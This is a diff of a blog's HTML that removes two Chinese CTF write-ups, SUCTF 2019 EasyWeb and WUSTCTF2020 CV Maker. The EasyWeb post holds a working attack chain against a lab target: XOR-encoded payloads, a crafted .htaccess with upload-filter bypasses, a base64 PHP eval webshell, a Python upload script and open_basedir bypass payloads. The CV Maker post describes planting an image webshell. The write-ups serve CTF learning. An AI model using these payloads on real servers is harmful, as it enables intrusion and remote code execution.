-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-107" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-107/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:26.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-107/">SUCTF 2019EasyWeb</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p> ctf里面什么所谓的easy baby全是骗人的一点都不easy</p>
-<p> 这<strong>正则直接过滤了所有的字母 可以用异或 取反 自增绕过</strong><br><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html">https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html</a><br>这个网站讲了操作<br>但是这关 对长度限制 自增看样子不行了 用异或绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function finds($string)&#123;</span><br><span class="line">	$index = 0;</span><br><span class="line">	$a=[33,35,36,37,40,41,42,43,45,47,58,59,60,62,63,64,92,93,94,123,125,128,129,130,131,132,133,134,135,136,137,138,139,140,141,142,143,144,145,146,147,148,149,150,151,152,153,154,155,156,157,158,159,160,161,162,163,164,165,166,167,168,169,170,171,172,173,174,175,176,177,178,179,180,181,182,183,184,185,186,187,188,189,190,191,192,193,194,195,196,197,198,199,200,201,202,203,204,205,206,207,208,209,210,211,212,213,214,215,216,217,218,219,220,221,222,223,224,225,226,227,228,229,230,231,232,233,234,235,236,237,238,239,240,241,242,243,244,245,246,247,248,249,250,251,252,253,254,255];</span><br><span class="line">	for($i=27;$i&lt;count($a);$i++)&#123;</span><br><span class="line">		for($j=27;$j&lt;count($a);$j++)&#123;</span><br><span class="line">			$x = $a[$i] ^ $a[$j];</span><br><span class="line">			for($k = 0;$k&lt;strlen($string);$k++)&#123;</span><br><span class="line">				if(ord($string[$k]) == $x)&#123;</span><br><span class="line">					echo $string[$k].&quot;\n&quot;;</span><br><span class="line">					echo &#x27;%&#x27; . dechex($a[$i]) . &#x27;^%&#x27; . dechex($a[$j]).&quot;\n&quot;;</span><br><span class="line">					$index++;</span><br><span class="line">					if($index == strlen($string))&#123;</span><br><span class="line">						return 0;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line">finds(&quot;_GET&quot;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-
-<p>运行这个生成这串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">G %86^%c1 E %86^%c3 T %86^%d2 _ %86^%d9  </span><br></pre></td></tr></table></figure>
-
-
-<p>组合一下就是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?_$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=phpinfo </span><br></pre></td></tr></table></figure>
-
-<p>这边各种限制 只能从**get_the_flag()**的函数下手<br>看到可以进行文件上传 但是过滤了后缀名 不能上传带有ph后缀的文件 php phtml都不行了</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nginx的服务器，而且上传目录下有一个php文件，所以上传.user.ini</span><br><span class="line">apache的服务器，应该上传.htaccess</span><br></pre></td></tr></table></figure>
-
-<p>这边是apache<br>还对内容进行了过滤 不能包含&lt;? 而且这边版本问题</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;php&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
-
-<p><strong>用不了</strong><br>这边可以将<strong>一句话进行base64编码 然后.htaccess利用php伪协议进行解码</strong><br>还有文件头检测 <strong>GIF89进行绕过</strong> 但是这边会有问题 上传的.htaccess文件无法生效<br>可以用 </p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337  用注释进行绕过 </span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application/x-httpd-php .ahhh</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shell.aaa</span><br><span class="line">GIF89a12 #加这个12 为了补足八字节满足base64编码规则</span><br><span class="line">PD9waHAgZXZhbCgkX0dFVFsnYSddKTs/Pg==</span><br></pre></td></tr></table></figure>
-
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import base64</span><br><span class="line"></span><br><span class="line">htaccess = b&quot;&quot;&quot;</span><br><span class="line">#define width 1337</span><br><span class="line">#define height 1337 </span><br><span class="line">AddType application/x-httpd-php .aaa</span><br><span class="line">php_value auto_append_file &quot;php://filter/convert.base64-decode/resource=./shell.aaa&quot;</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">shell = b&quot;GIF89a12&quot; + base64.b64encode(b&quot;&lt;?php eval($_REQUEST[&#x27;a&#x27;]);?&gt;&quot;)</span><br><span class="line">url = &quot;http://1e70a83e-d624-4134-b4d2-407896936c60.node4.buuoj.cn:81/?_=$&#123;%86%86%86%86^%d9%c1%c3%d2&#125;&#123;%86&#125;();&amp;%86=get_the_flag&quot;</span><br><span class="line"></span><br><span class="line">files = &#123;&#x27;file&#x27;:(&#x27;.htaccess&#x27;,htaccess,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">data = &#123;&quot;upload&quot;:&quot;Submit&quot;&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line">files = &#123;&#x27;file&#x27;:(&#x27;shell.aaa&#x27;,shell,&#x27;image/jpeg&#x27;)&#125;</span><br><span class="line">response = requests.post(url=url, data=data, files=files)</span><br><span class="line">print(response.text)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>获得上传到的路径可以进行访问</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/206.PNG?raw=true" alt="206.PNG"></p>
-<p>然后还需要绕过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">open_basedir</span><br></pre></td></tr></table></figure>
-
-<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/4720">https://xz.aliyun.com/t/4720</a> 这篇文章的payload可以直接使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell.aaa?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);var_dump(scandir(&quot;/&quot;));</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/207.PNG?raw=true" alt="207.PNG"></p>
-<p>然后访问这个this is the flag</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=chdir(&#x27;img&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);chdir(&#x27;..&#x27;);ini_set(&#x27;open_basedir&#x27;,&#x27;/&#x27;);echo(file_get_contents(&#x27;/THis_Is_tHe_F14g&#x27;));</span><br></pre></td></tr></table></figure>
-
-<p>就能拿到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-107/" data-id="cksyl7wj3000bw4w70k59bdaz" data-title="SUCTF 2019EasyWeb" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-page-106" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/08/13/page-106/" class="article-date">
-  <time class="dt-published" datetime="2021-08-13T09:37:24.000Z" itemprop="datePublished">2021-08-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/08/13/page-106/">WUSTCTF2020CV Maker</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>真不错这个页面打开的效果<br>注册提示了一堆warning 然而并没有sql注入 (；′⌒`)</p>
-<p>登录后 有一个更换头像 感觉可以试试上传漏洞<br>可以上传图片马 然后抓包可以看到上传路径</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/204.PNG?raw=true" alt="204.PNG"></p>
-<p>上传不了.htaccess 试一下直接上传过程改格式</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/205.PNG?raw=true" alt="205.PNG"></p>
-<p>太好了 蚁剑连接 ok 拿到flag</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/08/13/page-106/" data-id="cksyl7wiy0009w4w7f6nt3ntz" data-title="WUSTCTF2020CV Maker" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -849,23 +866,23 @@
       <ul>
         
           <li>
+            <a href="/2021/09/22/page-121/">GYCTF2020Easyphp</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-120/">红明谷CTF 2021write shell</a>
+          </li>
+        
+          <li>
+            <a href="/2021/09/22/page-119/">page</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/22/page-118/">长城杯flag保熟</a>
           </li>
         
           <li>
             <a href="/2021/09/22/page-117/">第五空间misc</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/09/page-115/">又是misc</a>
-          </li>
-        
-          <li>
-            <a href="/2021/09/09/page-114/">page</a>
           </li>
         
       </ul>
